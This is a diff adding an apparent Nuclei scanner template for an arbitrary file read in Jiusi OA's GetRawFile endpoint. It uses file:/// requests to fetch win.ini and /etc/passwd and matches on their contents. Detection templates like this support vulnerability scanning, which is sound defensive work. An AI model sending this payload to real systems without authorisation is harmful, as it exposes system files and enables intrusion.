@@ -1,0 +1,26 @@
+id: poc-yaml-jiusi-getrawfile-anyfile-read
+
+info:
+  name: 九思OA GetRawFile Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+variables:
+  paths:
+    - "C:/windows/win.ini"
+    - "etc/passwd"
+
+http:
+  - method: GET
+    path:
+      - "/jsoa/GetRawFile?url=file:///{{paths}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "!contains(body, '<')"
+          - "(contains(body, 'root:') && contains(body, '/bin')) || (contains(body, '[files]') && contains(body, 'bit app support'))"
